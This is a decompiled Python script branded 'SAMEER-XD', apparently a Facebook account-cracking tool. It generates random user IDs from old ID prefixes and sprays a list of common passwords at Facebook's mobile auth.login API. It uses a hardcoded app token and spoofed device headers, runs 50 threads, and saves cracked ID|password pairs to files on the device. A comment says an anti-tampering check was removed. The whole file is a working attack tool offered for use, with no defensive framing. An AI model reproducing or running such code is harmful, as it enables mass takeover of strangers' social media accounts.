# -*- coding: utf-8 -*-
# uncompyle6 version 3.9.1
# Python bytecode version base 3.10.4 (3413)
# Decompiled from: Python 3.11.9 (main, Apr  2 2024, 08:25:04) [Clang 15.0.0 (clang-1500.3.9.4)]
# Embedded file name: <string>
# Compiled at: 2024-05-18 10:48:33
# Size of source mod 2**32: 30043 bytes
import os, sys, time, datetime, random, hashlib, re, threading, json, requests, uuid, zlib, string
import concurrent.futures  # <-- এই লাইনটি যোগ করা হয়েছে
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
try:
    import mechanize
except ImportError:
    os.system("pip install mechanize")

try:
    import rich
except ImportError:
    os.system("pip install rich")

import requests, bs4, platform
from bs4 import BeautifulSoup as sop
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
try:
    if "3.12" in sys.version:
        import requests.packages.urllib3.util.ssl_
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'ALL'
except Exception as e:
    pass

# --- SECURITY CHECK REMOVED ---
# The original security check for HttpCanary has been removed to allow the script to run.

class sec:

    def __init__(self, paths):
        self.paths = paths

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        if any(os.path.exists(path) for path in self.paths):
            return
        os.system('clear')
        self.linex()
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print("\x1b[38;5;48m--------------------------------------------------")

P = "\x1b[1;37m"
M = "\x1b[38;5;196m"
H = "\x1b[38;5;46m"
K = "\x1b[38;5;220m"
B = "\x1b[38;5;203m"
U = "\x1b[38;5;40m"
ok = []
cp = []
id = []
user = []
loop = 0
ugen = []

def clear():
    if "linux" in sys.platform:
        os.system("clear")
    elif "win" in sys.platform:
        os.system("clear")
    else:
        os.system("clear")

def ____banner____():
    print(
        " \n        \n   _____         __  __ ______ ______ _____  \n  / ____|  /\\   |  \\/  |  ____|  ____|  __ \\ \n | (___   /  \\  | \\  / | |__  | |__  | |__) |\n  \\___ \\ / /\\ \\ | |\\/| |  __| |  __| |  _  / \n  ____) / ____ \\| |  | | |____| |____| | \\ \\ \n |_____/_/    \\_\\_|  |_|______|______|_|  \\_                                             \n                                                                                                                                  \n\x1b[0m"
    )

def _menu_():
    clear()
    ____banner____()
    linex()
    print("       (A) OLD CLONE")
    linex()
    rad = input(f"       CHOICE  : ")
    if rad in ("a", "A", "1", "01"):
        old_clone()
    else:
        print(" \n       Choose Valid Option... ")
        time.sleep(1)
        _menu_()

def old_clone():
    clear()
    ____banner____()
    linex()
    print("       (A) ALL SERIES")
    print("       (B) 100003/4 SERIES")
    print("       (C) 2009 series")
    linex()
    _Jihad_ = input("       <*> SELECT : ")
    if _Jihad_ in ("a", "A", "1", "01"):
        old_One()
    elif _Jihad_ in ("b", "B", "2", "02"):
        old_Tow()
    elif _Jihad_ in ("c", "C", "3", "03"):
        old_Tree()
    else:
        print(" \n[x] Choose Value Option... ")
        time.sleep(1)
        _menu_()

def old_One():
    clear()
    ____banner____()
    linex()
    print("       <*> EXAMPLE : 20000 / 30000 / 99999")
    linex()
    limit = int(input("       <*> SELECT : "))
    for star in range(limit):
        data = str(random.choice(range(100000000, 999999999)))
        user.append(data)
    print("       (A) >x< METHOD 1")
    print("       (B) >x< METHOD 2")
    meth = input("       <*> CHOICE (A/B): ").upper()
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as (pool):
        clear()
        ____banner____()
        linex()
        print(f"       <*> TOTAL ID FROM CRACK {len(user)}")
        print(f"       <*> USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        if meth in ("A", "01"):
            for mal in user:
                pool.submit(login_1, mal)
        elif meth in ("B", "02"):
            for mal in user:
                pool.submit(login_2, mal)
        else:
            print("[!] INVALID METHOD SELECTED")
            time.sleep(2)
            _menu_()
            
def old_Tow():
    clear()
    ____banner____()
    linex()
    print("       <*> OLD CODE : 100003 / 100004")
    print("       <*> SELECT : 100003")
    linex()
    prefixes = ['100003', '100004']
    prefix = input("       <*> EXAMPLE : ").strip()
    if prefix not in prefixes:
        print("[!] Invalid Prefix Selected")
        time.sleep(2)
        old_clone()
    print("       <*> EXAMPLE : 20000 / 30000 / 99999")
    limit = int(input("       <*> TOTAL ID COUNT : "))
    for _ in range(limit):
        suffix = "".join(random.choice(string.digits) for _ in range(4))
        user.append(prefix + suffix)
    print("       (A) METHOD A")
    print("       (B) METHOD B")
    meth = input("       <*> CHOICE : ").upper()
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as (pool):
        clear()
        ____banner____()
        linex()
        print(f"       <*> TOTAL ID FROM CRACK {len(user)}")
        print(f"       <*> USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        if meth in ("A", "01"):
            for mal in user:
                pool.submit(login_1, mal)
        elif meth in ("B", "02"):
            for mal in user:
                pool.submit(login_2, mal)

def old_Tree():
    clear()
    ____banner____()
    linex()
    print("       <*> OLD CODE : 100000 / 100001")
    print("       <*> SELECT : 100000")
    linex()
    prefixes = ['100000', '100001']
    prefix = input("       <*> EXAMPLE : ").strip()
    if prefix not in prefixes:
        print("[!] Invalid Prefix Selected")
        time.sleep(2)
        old_clone()
    print("       <*> EXAMPLE : 20000 / 30000 / 99999")
    limit = int(input("       <*> TOTAL ID COUNT : "))
    for _ in range(limit):
        suffix = "".join(random.choice(string.digits) for _ in range(4))
        user.append(prefix + suffix)
    print("       (A) METHOD A")
    print("       (B) METHOD B")
    meth = input("       <*> CHOICE : ").upper()
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as (pool):
        clear()
        ____banner____()
        linex()
        print(f"       <*> TOTAL ID FROM CRACK {len(user)}")
        print(f"       <*> USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        if meth in ("A", "01"):
            for mal in user:
                pool.submit(login_1, mal)
        elif meth in ("B", "02"):
            for mal in user:
                pool.submit(login_2, mal)

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('10000'):
            return '2009'
        elif uid.startswith('10000000'):
            return '2009'
        elif uid.startswith('1000000'):
            return '2009'
        elif uid.startswith('1000001'):
            return '2009'
        elif uid.startswith('1000002'):
            return '2009'
        elif uid.startswith('1000003'):
            return '2009'
        elif uid.startswith('1000004'):
            return '2009'
        elif uid.startswith('1000005'):
            return '2009'
        else:
            return '2008'
    elif len(uid) == 10:
        return '2014'
    elif len(uid) == 9:
        return '2015'
    elif len(uid) == 8:
        return '2016/2017'
    elif len(uid) == 7:
        return '2018/2019'
    elif len(uid) == 6:
        return '2020/2021'
    else:
        return '2022/2023/2024'

def linex():
    print("--------------------------------------------------")

def login_1(mal):
    global ok, cp, loop
    sys.stdout.write(f'\r\r+ (SAMEER-XD-M1) ({loop}) (OK:{len(ok)}) (CP:{len(cp)}) '),
    sys.stdout.flush()
    pw = [mal, '57273200', '59039200', '57575752', mal[2:], mal[3:], mal[4:], mal[5:], 'i love you', 'I love you', 'I LOVE YOU', 'iloveyou', 'free fire', 'Free Fire', 'FREE FIRE', 'freefire', 'Bangladesh', 'bangladesh', 'kolija', 'jan', 'pabna', 'pubg', 'jannat', 'sumaiya', 'sadiya', 'farjana']
    for pw in pw:
        pw = pw.lower()
        ses = requests.Session()
        pro = random.choice(ugen)
        url = 'https://b-api.facebook.com/method/auth.login'
        ads = str(uuid.uuid4())
        data = {'adid':ads,  'format':'json',  'device_id':str(uuid.uuid4()),  'cpl':'true',  'family_device_id':str(uuid.uuid4()),  'credentials_type':'device_based_login_password',  'error_detail_type':'button_with_disabled',  'source':'device_based_login',  'email':mal,  'password':pw,  'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',  'generate_session_cookies':'1',  'meta_inf_fbmeta':'',  'advertiser_id':ads,  'currently_logged_in_userid':'0',  'locale':'en_US',  'client_country_code':'US',  'method':'auth.login',  'fb_api_req_friendly_name':'authenticate',  'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',  'api_key':'882a8490361da98702bf97a021ddc14d'}
        head = {'User-Agent':pro,  'Content-Type':'application/x-www-form-urlencoded',  'Host':'graph.facebook.com',  'X-FB-Net-HNI':str(random.randint(20000, 40000)),  'X-FB-SIM-HNI':str(random.randint(20000, 40000)),  'X-FB-Connection-Type':'MOBILE.LTE',  'X-Tigon-Is-Retry':'False',  'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',  'x-fb-device-group':'5120',  'X-FB-Friendly-Name':'ViewerReactionsMutation',  'X-FB-Request-Analytics-Tags':'graphservice',  'X-FB-HTTP-Engine':'Liger',  'X-FB-Client-IP':'True',  'X-FB-Server-Cluster':'True',  'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
        res = ses.post(url, data, head, allow_redirects=False).json()
        if 'session_key' in res:
            print(f'\r\r+> (SAMEER-XD) = {mal} = {pw} = {creationyear(mal)}')
            open('/sdcard/SAMEER-XD-OLD-M1-OK.txt', 'a').write(mal + '|' + pw + '\n')
            ok.append(mal)
            break
        elif 'www.facebook.com' in res['error']['message']:
            print(f'\r\r+ (SAMEER-XD) = {mal} = {pw} = {creationyear(mal)}')
            cp.append(mal)
            break
    loop += 1

def login_2(mal):
    global ok, cp, loop
    sys.stdout.write(f'\r\r+ (SAMEER-XD-M2) ({loop}) (OK:{len(ok)}) (CP:{len(cp)}) '),
    sys.stdout.flush()
    pw = [mal, '57273200', '59039200', '57575752', '123123', mal[2:], mal[3:], mal[4:], mal[5:], 'i love you', 'I love you', 'I LOVE YOU', 'iloveyou', 'free fire', 'Free Fire', 'FREE FIRE', 'freefire', 'Bangladesh', 'bangladesh', 'kolija', 'jan', 'pabna', 'pubg', 'jannat', 'sumaiya', 'sadiya', 'farjana']
    for pw in pw:
        pw = pw.lower()
        ses = requests.Session()
        pro = random.choice(ugen)
        url = 'https://b-api.facebook.com/method/auth.login'
        ads = str(uuid.uuid4())
        data = {'adid':ads,  'format':'json',  'device_id':str(uuid.uuid4()),  'cpl':'true',  'family_device_id':str(uuid.uuid4()),  'credentials_type':'device_based_login_password',  'error_detail_type':'button_with_disabled',  'source':'device_based_login',  'email':mal,  'password':pw,  'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',  'generate_session_cookies':'1',  'meta_inf_fbmeta':'',  'advertiser_id':ads,  'currently_logged_in_userid':'0',  'locale':'en_US',  'client_country_code':'US',  'method':'auth.login',  'fb_api_req_friendly_name':'authenticate',  'fb_api_caller_class':'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',  'api_key':'882a8490361da98702bf97a021ddc14d'}
        head = {'User-Agent':pro,  'Content-Type':'application/x-www-form-urlencoded',  'Host':'b-api.facebook.com',  'X-FB-Net-HNI':str(random.randint(20000, 40000)),  'X-FB-SIM-HNI':str(random.randint(20000, 40000)),  'X-FB-Connection-Type':'cell.CTRadioAccessTechnologyHSDPA',  'X-Tigon-Is-Retry':'False',  'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',  'x-fb-device-group':'5120',  'X-FB-Friendly-Name':'ViewerReactionsMutation',  'X-FB-Request-Analytics-Tags':'graphservice',  'X-FB-HTTP-Engine':'Liger',  'X-FB-Client-IP':'True',  'X-FB-Server-Cluster':'True',  'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
        res = ses.post(url, data, head, allow_redirects=False).json()
        if 'session_key' in res:
            print(f'\r\r+> (SAMEER-XD) = {mal} = {pw} = {creationyear(mal)}')
            open('/sdcard/SAMEER-XD-OLD-M2-OK.txt', 'a').write(mal + '|' + pw + '\n')
            ok.append(mal)
            break
        elif 'www.facebook.com' in res['error']['message']:
            print(f'\r\r+ (SAMEER-XD) = {mal} = {pw} = {creationyear(mal)}')
            cp.append(mal)
            break
    loop += 1
    
if __name__ == "__main__":
    _menu_()